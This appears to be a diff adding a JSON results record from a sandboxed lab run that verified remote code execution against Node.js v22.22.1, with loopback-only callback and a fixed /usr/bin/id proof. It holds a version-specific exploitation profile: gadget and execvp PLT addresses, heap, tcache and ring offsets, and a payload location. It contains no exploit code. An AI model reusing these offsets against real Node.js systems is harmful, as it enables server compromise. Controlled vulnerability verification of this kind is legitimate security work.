@@ -1,0 +1,71 @@
+{
+  "attempts": [
+    {
+      "candidate": "v22-modern-0x220",
+      "container_log_tail": "",
+      "elapsed_seconds": 8.31,
+      "error": "TimeoutError: timed out",
+      "outcome": "not-verified"
+    },
+    {
+      "candidate": "v22-early-0x250",
+      "container_log_tail": "",
+      "elapsed_seconds": 7.68,
+      "error": "TimeoutError: timed out",
+      "outcome": "not-verified"
+    },
+    {
+      "candidate": "v22-0x220-old-ring",
+      "container_log_tail": "",
+      "elapsed_seconds": 7.522,
+      "error": "TimeoutError: timed out",
+      "outcome": "not-verified"
+    },
+    {
+      "candidate": "v22-0x250-new-ring",
+      "elapsed_seconds": 1.341,
+      "outcome": "rce-proof"
+    }
+  ],
+  "callback_peer": "127.0.0.1",
+  "lab_controls": {
+    "address_read_used": false,
+    "aslr": "enabled",
+    "callback": "127.0.0.1:4444",
+    "cap_drop": "ALL",
+    "debugger_used": false,
+    "kernel_randomize_va_space": 2,
+    "ld_preload_present": false,
+    "n2s_disable_aslr_present": false,
+    "no_new_privileges": true,
+    "proof_command": "/usr/bin/id (fixed)",
+    "read_only_rootfs": true,
+    "target": "127.0.0.1:3000"
+  },
+  "node_binary_sha256": "243fd8938011479f41b3de101842150fa990f33fbbb3f7aabd330857f2d79e1d",
+  "official_archive_sha256": "9a6bc82f9b491279147219f6a18add1e18424dce90d41d2a5fcd69d4924ba3aa",
+  "official_archive_url": "https://nodejs.org/dist/v22.22.1/node-v22.22.1-linux-x64.tar.xz",
+  "profile": {
+    "bss_payload": "0x6b47d30",
+    "callback_gadget": "0xf4f8f0",
+    "callback_pointer_offset": "0x0",
+    "context_pointer_offset": "0x18",
+    "execvp_plt": "0xe33d00",
+    "layout_candidate": "v22-0x250-new-ring",
+    "pContext": "0x6b47d48",
+    "pFree": "0x6b47d30",
+    "poison_staged_position": "-0x800a0f0",
+    "record_size": "0x250",
+    "ring_from_heap": "0x800ab70",
+    "tcache_entry_from_heap": "0xa80",
+    "tcache_index": 36
+  },
+  "proof_channel": "fresh loopback callback",
+  "proof_command": "/usr/bin/id (fixed)",
+  "proof_stdout": "uid=1000(node) gid=1000(node) groups=1000(node)",
+  "proof_token": "N2S_78d5df77e97fd30e25bf851d69b40be9",
+  "result": "rce-verified",
+  "verification_mode": "official-linux-x64-aslr-enabled-network-only-worker-heap",
+  "verified_at": "2026-10-23T21:42:15.095601+00:00",
+  "version": "22.22.1"
+}
